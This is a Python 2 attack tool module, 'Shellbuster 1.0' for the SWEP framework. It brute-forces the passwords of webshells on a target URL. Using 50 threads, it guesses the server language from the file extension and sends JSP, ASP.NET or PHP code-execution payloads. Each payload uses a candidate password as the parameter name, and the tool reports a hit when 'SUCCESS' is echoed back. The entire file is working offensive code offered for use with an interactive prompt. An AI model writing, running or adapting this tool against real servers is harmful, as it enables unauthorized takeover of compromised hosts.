import requests
import re
import queue
import threading


class exploit():
    def __init__(self):
        self.url = None
        self.language = None
        self.passlist = None
        self.Thread = 50
        self.Timeout = 3
        self._Counter = 0
        self._Queue = queue.Queue()
        pass

    def exploit(self):
        if not self.url:
            print '[!] Url not specified.'
        elif not self.language:
            print '[*] Language not provided. Trying identify language'
            ext = re.findall('([a-z]*)?$', self.url)[0]
            if ext in ['php', 'ph3', 'ph4', 'ph5', 'ph6', 'pht', 'phtml', 'php2', 'php3', 'php4', 'php5', 'php6',
                       'php7']:
                self.language = 'php'
            elif ext in ['cer', 'asa', 'asp', 'aspx']:
                self.language = 'dotnet'
            elif ext in ['jsp', 'action', 'jhtml', 'do']:
                self.language = 'jsp'
            else:
                print '[!] Language not specified'
                return
        try:
            for item in open(self.passlist).read().split('\n'):
                self._Queue.put(item)
            print '[*] %s password(s) loaded.' % (str(self._Queue.qsize()))
        except Exception, e:
            print '[!] Failed to load password list: %s' % (str(e))
        try:
            while not self._Queue.empty():
                if self.Thread > self._Counter:
                    try:
                        thread = threading.Thread(target=self.CheckPassword, args=(self.language, self._Queue.get()))
                        thread.start()
                    except Exception, e:
                        print '[!] Failed to start a thread: %s' % (str(e))
        except Exception, e:
            print '[!] Check password failed: %s' % (str(e))

    def CheckPassword(self, mode, password):
        try:
            if mode == 'jsp':
                resp = requests.post('http://%s?%s=out.println("SUCCESS");' % (self.url, password),
                                     {password: 'out.println("SUCCESS");'}).text
            elif mode == 'dotnet':
                resp = requests.post('http://%s?%s=Response.Write("SUCCESS")' % (self.url, password),
                                     {password: 'Response.Write("SUCCESS")'}).text
            elif mode == 'php':
                resp = requests.post('http://%s?%s=echo("SUCCESS");' % (self.url, password),
                                     {password: 'echo("SUCCESS")'}).text
            else:
                return
            if re.findall('SUCCESS', resp):
                print '[+] Password for %s found: %s' % (self.url, password)
        except requests.HTTPError:
            print '[*] A HTTP Error occured, Starting retry'
            self.CheckPassword(mode, password)
        except requests.ConnectionError:
            print '[*] Failed to connect to http://%s, Please check connection.' % (self.url)
        except Exception, e:
            print '[!] Error checking a password: %s' % (str(e))
        return

    def info(self):
        print """
        SWEP WEBSHELL PASSWORD SCANNER
        Author: BREACHER security
        Description: A simple shell password scanner.

        ARGS                DESCRIPTION
        ====                ===========
        url                 Target URL
        passlist            Password List
        Threads             Threads, Default: 50
        Timeout             (OPTIONAL) Request timeout
        """


if __name__ == '__main__':
    Session = exploit()
    print '[*] Shellbuster 1.0, SWEP Compatible'
    Session.url = raw_input("URL >")
    Session.passlist = raw_input("PASSWORD FILE >")
    Session.Thread = int(raw_input("THREAD >"))
    Session.exploit()

